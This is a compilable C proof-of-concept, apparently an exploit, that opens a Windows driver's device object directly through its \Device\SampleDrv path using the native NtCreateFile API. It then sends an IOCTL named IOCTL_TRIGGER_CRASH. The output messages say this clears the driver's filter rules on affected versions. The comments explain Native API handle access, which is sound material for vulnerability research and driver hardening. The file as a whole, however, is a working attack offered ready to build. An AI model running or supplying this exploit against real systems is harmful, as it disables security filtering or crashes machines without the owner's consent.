// Compile with:
// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
// cl.exe /nologo /Ox /MT /W0 /GS- /DNDDEBUG /Tc open_dev_direct.c /link /OUT:open_dev_direct.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
// This little POC, using sample driver control device as an example, demonstrates that it is not required to have a symlink created in \GLOBAL??\ or \DoSDevices\ to be able to open a handle to a device (e.g. to send an IOCTL to it). It can be done using direct OMNS \Devices\ path, as long as the device's security descriptor allows it, we just need to use the native API for NtCreateFile, bypassing the Win32 layer entirely.

#include <windows.h>
#include <stdio.h>

#define DEVICE_NAME L"\\Device\\SampleDrv"
#define IOCTL_TRIGGER_CRASH  0x2237fc

// Native API definitions
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

#define OBJ_CASE_INSENSITIVE 0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define FILE_OPEN 0x00000001

typedef NTSTATUS (WINAPI *NtCreateFile_t)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

typedef VOID (WINAPI *RtlInitUnicodeString_t)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
);

typedef NTSTATUS (WINAPI *NtClose_t)(HANDLE Handle);

int main(int argc, char *argv[])
{
    HANDLE hDevice = NULL;
    DWORD dwBytesReturned = 0;
    BOOL bResult;
    NTSTATUS status;
    UNICODE_STRING deviceName = {0};
    OBJECT_ATTRIBUTES oa = {0};
    IO_STATUS_BLOCK iosb = {0};
    char in_buff[0x100] = {0};
	char out_buff[0x100] = {0};
    
    // Load ntdll.dll function pointers
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll.dll handle\n");
        return 1;
    }

    RtlInitUnicodeString_t RtlInitUnicodeString = 
        (RtlInitUnicodeString_t)GetProcAddress(hNtdll, "RtlInitUnicodeString");
    NtCreateFile_t NtCreateFile = 
        (NtCreateFile_t)GetProcAddress(hNtdll, "NtCreateFile");
    NtClose_t NtClose = 
        (NtClose_t)GetProcAddress(hNtdll, "NtClose");

    if (!RtlInitUnicodeString || !NtCreateFile || !NtClose) {
        printf("[-] Failed to resolve ntdll functions\n");
        return 1;
    }

    printf("[*] Opening device %S using native API\n", DEVICE_NAME);
    
    // Initialize Unicode string and object attributes
    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    InitializeObjectAttributes(&oa, &deviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
	// Open device using NtCreateFile()
	// Note: For device objects, FileAttributes must be 0 and CreateOptions should be 0
	// SYNCHRONIZE is required even with DesiredAccess = 0
	/*
		Why SYNCHRONIZE is needed:
		CreateFileW() internally always adds SYNCHRONIZE access when opening any object, even when we specify DesiredAccess = 0. This allows the handle to be used with synchronization functions like WaitForSingleObject() and is required by the I/O Manager for proper IRP completion signaling.

		When calling NtCreateFile() directly, we must explicitly request SYNCHRONIZE because there's no automatic access mapping - we get exactly what we ask for. This is why the original CreateFileW with access 0 worked, but NtCreateFile() with access 0 failed.
	*/
    status = NtCreateFile(&hDevice,
                          SYNCHRONIZE,  /* Minimum access needed for device I/O */
                          &oa,
                          &iosb,
                          NULL,
                          0,  /* FileAttributes = 0 for device objects */
                          FILE_SHARE_READ | FILE_SHARE_WRITE,
                          FILE_OPEN,
                          0,  /* CreateOptions = 0 for direct device access */
                          NULL,
                          0);
    
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to open device: NTSTATUS 0x%08X\n", status);
        printf("    Driver may not be loaded or the version is not affected)\n");
        return 1;
    }
    printf("[+] Device opened successfully via NtCreateFile\n");
    
    printf("[*] Sending packet via IOCTL 0x%08X...\n", IOCTL_TRIGGER_CRASH);
    
	
    bResult = DeviceIoControl(hDevice,
                              IOCTL_TRIGGER_CRASH,
                              in_buff,
                              sizeof(in_buff),
                              out_buff,
                              sizeof(out_buff),
                              &dwBytesReturned,
                              NULL);
    if (bResult) {
        printf("[+] IOCTL sent!\n");
        printf("[+] Filter rules should be cleared now.\n");
    }
	else 
	{
        DWORD dwError = GetLastError();
        printf("[-] DeviceIoControl failed: %d (0x%08X)\n", dwError, dwError);
    }
    NtClose(hDevice);
    printf("\n[*] Done\n");

    return 0;
}
